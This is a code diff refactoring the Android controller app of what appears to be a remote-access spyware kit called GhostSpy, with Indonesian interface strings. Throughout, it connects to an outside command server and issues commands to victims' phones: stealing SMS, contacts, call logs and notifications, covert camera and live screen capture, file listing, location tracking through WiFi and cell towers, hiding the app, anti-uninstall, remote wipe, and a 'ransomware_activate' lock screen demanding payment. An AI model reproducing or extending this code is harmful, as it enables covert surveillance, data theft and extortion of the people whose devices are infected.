@@ -31,20 +31,19 @@ public class ControlActivity extends Activity {
         String model = getIntent().getStringExtra("deviceModel");
         String battery = getIntent().getStringExtra("battery");
 
-        // Root layout dengan ScrollView
+        // Root dengan ScrollView
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(0xFF090909);
-        setContentView(root);
 
-        ScrollView scrollView = new ScrollView(this);
-        scrollView.setFillViewport(true);
+        ScrollView scroll = new ScrollView(this);
+        scroll.setFillViewport(true);
 
         LinearLayout content = new LinearLayout(this);
         content.setOrientation(LinearLayout.VERTICAL);
         content.setPadding(0, 0, 0, 32);
 
-        // ========== HEADER ==========
+        // ===== HEADER =====
         LinearLayout header = new LinearLayout(this);
         header.setOrientation(LinearLayout.HORIZONTAL);
         header.setGravity(Gravity.CENTER_VERTICAL);
@@ -77,114 +76,75 @@ public class ControlActivity extends Activity {
         header.addView(notif);
         content.addView(header);
 
-        // ========== PANEL LOCK/UNLOCK ==========
+        // ===== LOCK / UNLOCK =====
         LinearLayout lockPanel = new LinearLayout(this);
         lockPanel.setOrientation(LinearLayout.HORIZONTAL);
         lockPanel.setGravity(Gravity.CENTER);
-        lockPanel.setPadding(16, 16, 16, 8);
+        lockPanel.setPadding(12, 10, 12, 6);
 
-        Button lockScreenBtn = new Button(this);
-        lockScreenBtn.setText("🔒 Lock Screen");
-        lockScreenBtn.setTextColor(0xFFFFFFFF);
-        lockScreenBtn.setBackgroundColor(0xFFFF1744);
-        lockScreenBtn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams lockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
-        lockBtnParams.setMargins(6, 0, 6, 0);
-        lockScreenBtn.setLayoutParams(lockBtnParams);
-        lockScreenBtn.setOnClickListener(v -> showLockScreenDialog());
-        lockPanel.addView(lockScreenBtn);
+        Button lockBtn = createActionBtn("Lock", "#FF1744");
+        lockBtn.setOnClickListener(v -> showLockScreenDialog());
+        lockPanel.addView(lockBtn);
 
-        Button unlockBtn = new Button(this);
-        unlockBtn.setText("🔓 Unlock");
-        unlockBtn.setTextColor(0xFFFFFFFF);
-        unlockBtn.setBackgroundColor(0xFF00E676);
-        unlockBtn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams unlockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
-        unlockBtnParams.setMargins(6, 0, 6, 0);
-        unlockBtn.setLayoutParams(unlockBtnParams);
+        Button unlockBtn = createActionBtn("Unlock", "#00E676");
         unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
         lockPanel.addView(unlockBtn);
         content.addView(lockPanel);
 
-        // ========== PANEL ALAT TAMBAHAN ==========
+        // ===== TOOLS =====
         LinearLayout toolsPanel = new LinearLayout(this);
         toolsPanel.setOrientation(LinearLayout.HORIZONTAL);
         toolsPanel.setGravity(Gravity.CENTER);
-        toolsPanel.setPadding(16, 8, 16, 8);
+        toolsPanel.setPadding(12, 4, 12, 8);
 
-        Button antiUninstallBtn = new Button(this);
-        antiUninstallBtn.setText("🛡️ Anti-Uninstall");
-        antiUninstallBtn.setTextColor(0xFFFFFFFF);
-        antiUninstallBtn.setBackgroundColor(0xFF2196F3);
-        antiUninstallBtn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams toolBtnParams = new LinearLayout.LayoutParams(0, 56, 1);
-        toolBtnParams.setMargins(4, 0, 4, 0);
-        antiUninstallBtn.setLayoutParams(toolBtnParams);
-        antiUninstallBtn.setOnClickListener(v -> showAntiUninstallDialog());
-        toolsPanel.addView(antiUninstallBtn);
+        Button antiBtn = createToolBtn("Anti‑Uninstall", "#2196F3", v -> showAntiUninstallDialog());
+        toolsPanel.addView(antiBtn);
 
-        Button renameBtn = new Button(this);
-        renameBtn.setText("✏️ Rename");
-        renameBtn.setTextColor(0xFFFFFFFF);
-        renameBtn.setBackgroundColor(0xFF9C27B0);
-        renameBtn.setGravity(Gravity.CENTER);
-        renameBtn.setLayoutParams(toolBtnParams);
-        renameBtn.setOnClickListener(v -> showRenameDialog());
+        Button renameBtn = createToolBtn("Rename", "#9C27B0", v -> showRenameDialog());
         toolsPanel.addView(renameBtn);
 
-        Button iconBtn = new Button(this);
-        iconBtn.setText("🖼️ Ikon");
-        iconBtn.setTextColor(0xFFFFFFFF);
-        iconBtn.setBackgroundColor(0xFFFF9800);
-        iconBtn.setGravity(Gravity.CENTER);
-        iconBtn.setLayoutParams(toolBtnParams);
-        iconBtn.setOnClickListener(v -> showChangeIconDialog());
+        Button iconBtn = createToolBtn("Icon", "#FF9800", v -> showChangeIconDialog());
         toolsPanel.addView(iconBtn);
 
-        Button payloadBtn = new Button(this);
-        payloadBtn.setText("📦 Payload");
-        payloadBtn.setTextColor(0xFFFFFFFF);
-        payloadBtn.setBackgroundColor(0xFF00BCD4);
-        payloadBtn.setGravity(Gravity.CENTER);
-        payloadBtn.setLayoutParams(toolBtnParams);
-        payloadBtn.setOnClickListener(v -> showPayloadDialog());
+        Button payloadBtn = createToolBtn("Payload", "#00BCD4", v -> showPayloadDialog());
         toolsPanel.addView(payloadBtn);
         content.addView(toolsPanel);
 
-        // ========== GRID MENU 2 KOLOM ==========
+        // ===== GRID 3 KOLOM =====
         LinearLayout grid = new LinearLayout(this);
         grid.setOrientation(LinearLayout.VERTICAL);
-        grid.setPadding(16, 12, 16, 12);
+        grid.setPadding(12, 8, 12, 12);
 
+        // Data: label, warna, command
         String[][] items = {
-            {"📷", "Kamera", "#FF1744", "start_camera"},
-            {"💬", "SMS", "#FF4D8D", "get_sms"},
-            {"👥", "Kontak", "#00E676", "get_contacts"},
-            {"📞", "Panggilan", "#FFC107", "get_calls"},
-            {"🖥️", "Live Screen", "#2ED8FF", "live_screen"},
-            {"📦", "Aplikasi", "#2196F3", "get_apps"},
-            {"🌐", "Jaringan", "#9C27B0", "get_network"},
-            {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
-            {"📶", "WiFi Scan", "#00BCD4", "wifiscan"},
-            {"📁", "File Mgr", "#FF5722", "list_files"},
-            {"📡", "Cell Tower", "#607D8B", "celltower"},
-            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"}
+            {"Camera", "#FF1744", "start_camera"},
+            {"SMS", "#FF4D8D", "get_sms"},
+            {"Contacts", "#00E676", "get_contacts"},
+            {"Call", "#FFC107", "get_calls"},
+            {"Live Screen", "#2ED8FF", "live_screen"},
+            {"Apps", "#2196F3", "get_apps"},
+            {"Network", "#9C27B0", "get_network"},
+            {"Notify", "#FF9800", "get_notifications"},
+            {"WiFi Scan", "#00BCD4", "wifiscan"},
+            {"Files", "#FF5722", "list_files"},
+            {"Cell Tower", "#607D8B", "celltower"},
+            {"WiFi Hist", "#3F51B5", "wifihistory"}
         };
 
         LinearLayout row = null;
         for (int i = 0; i < items.length; i++) {
-            if (i % 2 == 0) {
+            if (i % 3 == 0) {
                 row = new LinearLayout(this);
                 row.setOrientation(LinearLayout.HORIZONTAL);
                 grid.addView(row);
             }
-            row.addView(createMenuCard(items[i]));
+            row.addView(createGridCard(items[i][0], items[i][1], items[i][2]));
         }
         content.addView(grid);
 
-        // ========== CONTROL CENTER ==========
+        // ===== CONTROL CENTER =====
         TextView controlCenter = new TextView(this);
-        controlCenter.setText("🎛️ Control Center");
+        controlCenter.setText("Control Center");
         controlCenter.setTextColor(0xFFFFFFFF);
         controlCenter.setBackground(getDrawable(R.drawable.card_admin));
         controlCenter.setPadding(16, 12, 16, 12);
@@ -196,8 +156,9 @@ public class ControlActivity extends Activity {
         controlCenter.setOnClickListener(v -> showControlPopup());
         content.addView(controlCenter);
 
-        scrollView.addView(content);
-        root.addView(scrollView);
+        scroll.addView(content);
+        root.addView(scroll);
+        setContentView(root);
 
         try {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
@@ -205,25 +166,100 @@ public class ControlActivity extends Activity {
         } catch (URISyntaxException e) {}
     }
 
-    // ========== DIALOG METHODS ==========
+    // ===== HELPER BUTTONS =====
+    private Button createActionBtn(String text, String color) {
+        Button btn = new Button(this);
+        btn.setText(text);
+        btn.setTextColor(0xFFFFFFFF);
+        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
+        btn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 52, 1);
+        p.setMargins(4, 0, 4, 0);
+        btn.setLayoutParams(p);
+        return btn;
+    }
+
+    private Button createToolBtn(String text, String color, android.view.View.OnClickListener listener) {
+        Button btn = new Button(this);
+        btn.setText(text);
+        btn.setTextColor(0xFFFFFFFF);
+        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
+        btn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 44, 1);
+        p.setMargins(3, 0, 3, 0);
+        btn.setLayoutParams(p);
+        btn.setOnClickListener(listener);
+        return btn;
+    }
+
+    private LinearLayout createGridCard(String label, String color, String cmd) {
+        LinearLayout card = new LinearLayout(this);
+        card.setOrientation(LinearLayout.VERTICAL);
+        card.setGravity(Gravity.CENTER);
+        card.setBackgroundColor((int) Long.parseLong(color.substring(1), 16) | 0x22000000);
+        card.setPadding(4, 14, 4, 14);
+        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 110, 1);
+        p.setMargins(4, 4, 4, 4);
+        card.setLayoutParams(p);
+
+        // Ikon sederhana (bukan stiker)
+        TextView icon = new TextView(this);
+        icon.setText(getIconForCmd(cmd));
+        icon.setTextColor(0xFFFFFFFF);
+        icon.setTextSize(18);
+        icon.setGravity(Gravity.CENTER);
+
+        TextView lbl = new TextView(this);
+        lbl.setText(label);
+        lbl.setTextColor(0xFFCCCCCC);
+        lbl.setTextSize(10);
+        lbl.setGravity(Gravity.CENTER);
+        lbl.setPadding(0, 4, 0, 0);
+
+        card.addView(icon);
+        card.addView(lbl);
+
+        card.setOnClickListener(v -> {
+            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
+                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
+                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
+            scale.setDuration(120);
+            scale.setRepeatCount(0);
+            v.startAnimation(scale);
+            handleAction(cmd);
+        });
+        return card;
+    }
+
+    private String getIconForCmd(String cmd) {
+        switch (cmd) {
+            case "start_camera": return "📷";
+            case "get_sms": return "💬";
+            case "get_contacts": return "👥";
+            case "get_calls": return "📞";
+            case "live_screen": return "🖥";
+            case "get_apps": return "📦";
+            case "get_network": return "🌐";
+            case "get_notifications": return "🔔";
+            case "wifiscan": return "📶";
+            case "list_files": return "📁";
+            case "celltower": return "📡";
+            case "wifihistory": return "🕒";
+            default: return "•";
+        }
+    }
+
+    // ===== DIALOGS =====
     private void showAntiUninstallDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("🛡️ Anti-Uninstall Protection");
-        LinearLayout lay = new LinearLayout(this);
-        lay.setOrientation(LinearLayout.VERTICAL);
-        lay.setPadding(24, 16, 24, 16);
-
+        b.setTitle("Anti‑Uninstall");
         CheckBox toggle = new CheckBox(this);
-        toggle.setText("Aktifkan Anti-Uninstall");
+        toggle.setText("Aktifkan");
         toggle.setTextColor(0xFFFFFFFF);
         toggle.setChecked(true);
-        lay.addView(toggle);
-
-        b.setView(lay);
+        b.setView(toggle);
         b.setPositiveButton("Terapkan", (d, w) -> {
-            JSONObject params = new JSONObject();
-            try { params.put("state", toggle.isChecked()); } catch (Exception e) {}
-            sendCmd("anti_uninstall", params);
+            try { sendCmd("anti_uninstall", new JSONObject().put("state", toggle.isChecked())); } catch (Exception e) {}
         });
         b.setNegativeButton("Batal", null);
         b.show();
@@ -231,19 +267,16 @@ public class ControlActivity extends Activity {
 
     private void showRenameDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("✏️ Ubah Nama APK");
+        b.setTitle("Rename APK");
         EditText input = new EditText(this);
         input.setHint("Nama baru");
         input.setTextColor(0xFFFFFFFF);
         input.setBackgroundColor(0xFF252525);
-        input.setPadding(16, 12, 16, 12);
         b.setView(input);
         b.setPositiveButton("Ubah", (d, w) -> {
-            String newName = input.getText().toString().trim();
-            if (!newName.isEmpty()) {
-                JSONObject params = new JSONObject();
-                try { params.put("newName", newName); } catch (Exception e) {}
-                sendCmd("rename_app", params);
+            String name = input.getText().toString().trim();
+            if (!name.isEmpty()) {
+                try { sendCmd("rename_app", new JSONObject().put("newName", name)); } catch (Exception e) {}
             }
         });
         b.setNegativeButton("Batal", null);
@@ -252,19 +285,16 @@ public class ControlActivity extends Activity {
 
     private void showChangeIconDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("🖼️ Ganti Ikon APK");
+        b.setTitle("Ganti Ikon");
         EditText input = new EditText(this);
-        input.setHint("URL gambar (PNG/JPG)");
+        input.setHint("URL gambar");
         input.setTextColor(0xFFFFFFFF);
         input.setBackgroundColor(0xFF252525);
-        input.setPadding(16, 12, 16, 12);
         b.setView(input);
         b.setPositiveButton("Ganti", (d, w) -> {
             String url = input.getText().toString().trim();
             if (!url.isEmpty()) {
-                JSONObject params = new JSONObject();
-                try { params.put("url", url); } catch (Exception e) {}
-                sendCmd("change_icon", params);
+                try { sendCmd("change_icon", new JSONObject().put("url", url)); } catch (Exception e) {}
             }
         });
         b.setNegativeButton("Batal", null);
@@ -273,31 +303,25 @@ public class ControlActivity extends Activity {
 
     private void showPayloadDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("📦 Payload Control");
+        b.setTitle("Payload");
         LinearLayout lay = new LinearLayout(this);
         lay.setOrientation(LinearLayout.HORIZONTAL);
-        lay.setPadding(24, 16, 24, 16);
         lay.setGravity(Gravity.CENTER);
+        lay.setPadding(16, 16, 16, 16);
 
-        Button hideBtn = new Button(this);
-        hideBtn.setText("👻 Hide Payload");
-        hideBtn.setTextColor(0xFFFFFFFF);
-        hideBtn.setBackgroundColor(0xFFFF1744);
-        hideBtn.setOnClickListener(v -> {
-            sendCmd("hide_app");
-            Toast.makeText(this, "Payload disembunyikan", Toast.LENGTH_SHORT).show();
-        });
-        lay.addView(hideBtn);
+        Button hide = new Button(this);
+        hide.setText("Hide");
+        hide.setTextColor(0xFFFFFFFF);
+        hide.setBackgroundColor(0xFFFF1744);
+        hide.setOnClickListener(v -> sendCmd("hide_app"));
+        lay.addView(hide);
 
-        Button unhideBtn = new Button(this);
-        unhideBtn.setText("👁️ Unhide Payload");
-        unhideBtn.setTextColor(0xFFFFFFFF);
-        unhideBtn.setBackgroundColor(0xFF00E676);
-        unhideBtn.setOnClickListener(v -> {
-            sendCmd("unhide_app");
-            Toast.makeText(this, "Payload ditampilkan", Toast.LENGTH_SHORT).show();
-        });
-        lay.addView(unhideBtn);
+        Button unhide = new Button(this);
+        unhide.setText("Unhide");
+        unhide.setTextColor(0xFFFFFFFF);
+        unhide.setBackgroundColor(0xFF00E676);
+        unhide.setOnClickListener(v -> sendCmd("unhide_app"));
+        lay.addView(unhide);
 
         b.setView(lay);
         b.setNegativeButton("Tutup", null);
@@ -321,21 +345,15 @@ public class ControlActivity extends Activity {
         container.setLayoutParams(rootParams);
 
         TextView title = new TextView(this);
-        title.setText("🔒 Custom Lock Screen");
+        title.setText("Custom Lock Screen");
         title.setTextColor(0xFFFFFFFF);
         title.setTextSize(20);
         title.setTypeface(null, android.graphics.Typeface.BOLD);
         title.setPadding(0, 0, 0, 16);
         container.addView(title);
 
-        TextView htmlLabel = new TextView(this);
-        htmlLabel.setText("HTML Code:");
-        htmlLabel.setTextColor(0xFF9AA3B2);
-        htmlLabel.setTextSize(12);
-        container.addView(htmlLabel);
-
         EditText htmlEditor = new EditText(this);
-        htmlEditor.setHint("<h1>HP TERKUNCI</h1><p>Bayar 1 BTC</p>");
+        htmlEditor.setHint("<h1>HP TERKUNCI</h1>");
         htmlEditor.setTextColor(0xFFFFFFFF);
         htmlEditor.setBackgroundColor(0xFF252525);
         htmlEditor.setPadding(16, 12, 16, 12);
@@ -343,19 +361,13 @@ public class ControlActivity extends Activity {
         htmlEditor.setGravity(Gravity.TOP);
         container.addView(htmlEditor);
 
-        TextView previewLabel = new TextView(this);
-        previewLabel.setText("Preview:");
-        previewLabel.setTextColor(0xFF9AA3B2);
-        previewLabel.setTextSize(12);
-        previewLabel.setPadding(0, 12, 0, 4);
-        container.addView(previewLabel);
-
         WebView preview = new WebView(this);
         preview.setWebViewClient(new WebViewClient());
         preview.getSettings().setJavaScriptEnabled(false);
         preview.setBackgroundColor(0xFF000000);
         LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 220);
+        webParams.setMargins(0, 8, 0, 12);
         preview.setLayoutParams(webParams);
         container.addView(preview);
 
@@ -367,15 +379,8 @@ public class ControlActivity extends Activity {
             }
         });
 
-        TextView pinLabel = new TextView(this);
-        pinLabel.setText("PIN (4-6 digit):");
-        pinLabel.setTextColor(0xFF9AA3B2);
-        pinLabel.setTextSize(12);
-        pinLabel.setPadding(0, 12, 0, 4);
-        container.addView(pinLabel);
-
         EditText pinInput = new EditText(this);
-        pinInput.setHint("1234");
+        pinInput.setHint("PIN (4-6 digit)");
         pinInput.setTextColor(0xFFFFFFFF);
         pinInput.setBackgroundColor(0xFF252525);
         pinInput.setPadding(16, 12, 16, 12);
@@ -388,7 +393,7 @@ public class ControlActivity extends Activity {
         btnRow.setPadding(0, 16, 0, 0);
 
         Button jalankanBtn = new Button(this);
-        jalankanBtn.setText("🔒 Jalankan");
+        jalankanBtn.setText("Jalankan");
         jalankanBtn.setTextColor(0xFFFFFFFF);
         jalankanBtn.setBackgroundColor(0xFF00E676);
         jalankanBtn.setOnClickListener(v -> {
@@ -398,15 +403,15 @@ public class ControlActivity extends Activity {
                 Toast.makeText(this, "HTML & PIN harus diisi", Toast.LENGTH_SHORT).show();
                 return;
             }
-            sendCmd("ransomware_activate", new JSONObject() {{
-                try { put("html", html); put("pin", pin); } catch (Exception e) {}
-            }});
+            try {
+                sendCmd("ransomware_activate", new JSONObject().put("html", html).put("pin", pin));
+            } catch (Exception e) {}
             dialog.dismiss();
         });
         btnRow.addView(jalankanBtn);
 
         Button matikanBtn = new Button(this);
-        matikanBtn.setText("🔓 Matikan");
+        matikanBtn.setText("Matikan");
         matikanBtn.setTextColor(0xFFFFFFFF);
         matikanBtn.setBackgroundColor(0xFFFF1744);
         matikanBtn.setOnClickListener(v -> {
@@ -428,46 +433,8 @@ public class ControlActivity extends Activity {
         dialog.show();
 
         AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
-        fadeIn.setDuration(300);
+        fadeIn.setDuration(250);
         container.startAnimation(fadeIn);
-    }
-
-    private LinearLayout createMenuCard(String[] item) {
-        LinearLayout card = new LinearLayout(this);
-        card.setOrientation(LinearLayout.VERTICAL);
-        card.setGravity(Gravity.CENTER);
-        card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
-        card.setPadding(8, 20, 8, 20);
-        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, 150, 1);
-        params.setMargins(6, 6, 6, 6);
-        card.setLayoutParams(params);
-
-        TextView icon = new TextView(this);
-        icon.setText(item[0]);
-        icon.setTextSize(28);
-        icon.setGravity(Gravity.CENTER);
-
-        TextView label = new TextView(this);
-        label.setText(item[1]);
-        label.setTextColor(0xFFFFFFFF);
-        label.setTextSize(12);
-        label.setGravity(Gravity.CENTER);
-        label.setPadding(0, 8, 0, 0);
-
-        card.addView(icon);
-        card.addView(label);
-
-        card.setOnClickListener(v -> {
-            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
-                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
-                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
-            scale.setDuration(150);
-            scale.setRepeatCount(0);
-            v.startAnimation(scale);
-            handleAction(item[3]);
-        });
-
-        return card;
     }
 
     private void handleAction(String cmd) {
@@ -489,7 +456,7 @@ public class ControlActivity extends Activity {
 
     private void showControlPopup() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("🎛️ Control Center");
+        b.setTitle("Control Center");
         LinearLayout lay = new LinearLayout(this);
         lay.setOrientation(LinearLayout.VERTICAL);
         String[] cmds = {"flashlight", "vibrate", "lock", "unlock", "toast", "openurl", "wipe"};
@@ -518,10 +485,10 @@ public class ControlActivity extends Activity {
                 msg.put("command", cmd);
                 msg.put("params", params);
                 socket.emit("command", msg);
-                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "Ok " + cmd, Toast.LENGTH_SHORT).show();
             } catch (Exception e) {}
         } else {
-            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Offline", Toast.LENGTH_SHORT).show();
         }
     }
 }
